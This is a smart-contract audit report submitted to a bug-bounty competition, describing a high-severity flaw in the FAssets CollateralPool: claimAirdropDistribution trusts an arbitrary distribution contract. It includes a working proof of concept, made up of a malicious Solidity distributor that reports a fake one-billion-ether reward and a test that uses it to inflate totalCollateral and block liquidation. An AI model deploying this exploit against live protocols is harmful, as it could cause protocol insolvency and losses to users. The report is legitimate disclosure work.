# #46985 \[SC-High] CollateralPool::totalCollateral can be increased to arbitrary value

**Submitted on Jun 7th 2025 at 10:27:34 UTC by @rick137 for** [**Audit Comp | Flare | FAssets**](https://immunefi.com/audit-competition/audit-comp-flare-fassets)

* **Report ID:** #46985
* **Report Type:** Smart Contract
* **Report severity:** High
* **Target:** <https://github.com/flare-foundation/fassets/blob/main/contracts/assetManager/implementation/CollateralPool.sol>
* **Impacts:**
  * Protocol insolvency

## Description

## Brief/Intro

`totalCollateral` can be increased to arbitrary value without any deposit due to lack of validation for `_distribution` parameter in `CollateralPool::claimAirdropDistribution`

## Vulnerability Details

```
0- agent is created by owner
1- collaterals is deposited and agent is made available by owner
2- f-assets is minted by a minter
3- Nat price will be changed and the agent becomes eligible for liquidation
4- MaliciousDistributionToDelegators contract is deployed by agent's owner and will be passed to claimAirdropDistribution as parameter and totalCollateral will be increased to an arbitrary value to escape liquidation.

```

## Impact Details

Liquidatable agents cannot be liquidated

## Proof of Concept

## Proof of Concept

Consider to create this contract in `contracts/assetManager/mock` directory

<details>

<summary>Malicous Distributor Contract</summary>

```solidity
    // SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "../interfaces/IWNat.sol";

contract MaliciousDistributionToDelegators {
    IWNat private wNat;

    event OptedOutOfAirdrop(address account);

    constructor(IWNat _wNat) {
        wNat = _wNat;
    }

    function claim(address /* _rewardOwner */, address _recipient, uint256 /* _month */, bool /* _wrap */)
        external returns(uint256 _rewardAmount)
    {
        uint256 reward = 1000000000 ether;
        return reward;
    }

    function optOutOfAirdrop() external {
        emit OptedOutOfAirdrop(msg.sender);
    }

}

```

</details>

```typescript
import { expectEvent, expectRevert } from "@openzeppelin/test-helpers";
import { DAYS, deepFormat, MAX_BIPS, toBIPS, toBN, toBNExp, toWei } from "../../../lib/utils/helpers";
import { MockChain } from "../../utils/fasset/MockChain";
import { MockFlareDataConnectorClient } from "../../utils/fasset/MockFlareDataConnectorClient";
import { deterministicTimeIncrease, getTestFile, loadFixtureCopyVars } from "../../utils/test-helpers";
import { assertWeb3Equal } from "../../utils/web3assertions";
import { Agent } from "../utils/Agent";
import { AssetContext } from "../utils/AssetContext";
import { CommonContext } from "../utils/CommonContext";
import { Minter } from "../utils/Minter";
import { Redeemer } from "../utils/Redeemer";
import { testChainInfo } from "../utils/TestChainInfo";
import { filterEvents, requiredEventArgs } from "../../../lib/utils/events/truffle";
import { PaymentReference } from "../../../lib/fasset/PaymentReference";
import { Challenger } from "../utils/Challenger";
import { Liquidator } from "../utils/Liquidator";
import { ZERO_ADDRESS } from "../../../deployment/lib/deploy-utils";
import { time } from "@nomicfoundation/hardhat-network-helpers";
const DistributionToDelegators = artifacts.require("MaliciousDistributionToDelegators");

import {
    DistributionToDelegatorsInstance,
    ERC20MockInstance
} from "../../../../typechain-truffle";
const ERC20Mock = artifacts.require("ERC20Mock");

contract(`AssetManager.sol; ${getTestFile(__filename)}; Asset manager simulations`, async accounts => {
    const governance = accounts[10];
    const agentOwner1 = accounts[20];
    const minterAddress1 = accounts[30];
    const underlyingAgent1 = "Agent1";
    const underlyingMinter1 = "Minter1";
    const underlyingRedeemer2 = "Redeemer2";

    let commonContext: CommonContext;
    let context: AssetContext;
    let mockChain: MockChain;
    let mockFlareDataConnectorClient: MockFlareDataConnectorClient;

    async function initialize() {
        commonContext = await CommonContext.createTest(governance);
        context = await AssetContext.createTest(commonContext, testChainInfo.xrp);
        return { commonContext, context };
    }

    beforeEach(async () => {
        ({ commonContext, context } = await loadFixtureCopyVars(initialize));
        mockChain = context.chain as MockChain;
        mockFlareDataConnectorClient = context.flareDataConnectorClient as MockFlareDataConnectorClient;
    });

        it.only("malicious agent can change totalCollateral in favor of themself", async() => {
            let wNat: ERC20MockInstance;
            wNat = await ERC20Mock.new("wNative", "wNat");
            // 0- agent is created by owner
            const agent = await Agent.createTest(context, agentOwner1, underlyingAgent1);
            const fullAgentCollateral = toWei(3e8);
            // 1- collateral is deposited and agent is made available by owner
            await agent.depositCollateralsAndMakeAvailable(fullAgentCollateral, fullAgentCollateral);
            const minter = await Minter.createTest(context, minterAddress1, underlyingMinter1, context.convertLotsToUBA(100));
            // 2- f-assets is minted by a minter
            await minter.performMinting(agent.vaultAddress, 10);

            // 3- Nat price will be changed and the agent becomes eligible for liquidation
            await agent.setPoolCollateralRatioByChangingAssetPrice(18_000);

            let info = await agent.getAgentInfo();
            console.log(deepFormat({
                vaultCollateralRatioBIPS: Number(info.vaultCollateralRatioBIPS) / MAX_BIPS,
                poolCollateralRatioBIPS: Number(info.poolCollateralRatioBIPS) / MAX_BIPS,
            }));

            //4- MaliciousDistributionToDelegators contract is deployed and will be passed to claimAirdropDistribution as parameter and totalCollateral will be increased to an arbitrary value to escape liquidation.
            const distributionToDelegators: DistributionToDelegatorsInstance = await DistributionToDelegators.new(wNat.address);
            await agent.collateralPool.claimAirdropDistribution(distributionToDelegators.address, 0, { from: agent.ownerWorkAddress });

            info = await agent.getAgentInfo();
            console.log(deepFormat({
                vaultCollateralRatioBIPS: Number(info.vaultCollateralRatioBIPS) / MAX_BIPS,
                poolCollateralRatioBIPS: Number(info.poolCollateralRatioBIPS) / MAX_BIPS,
            }));


        });
});
```
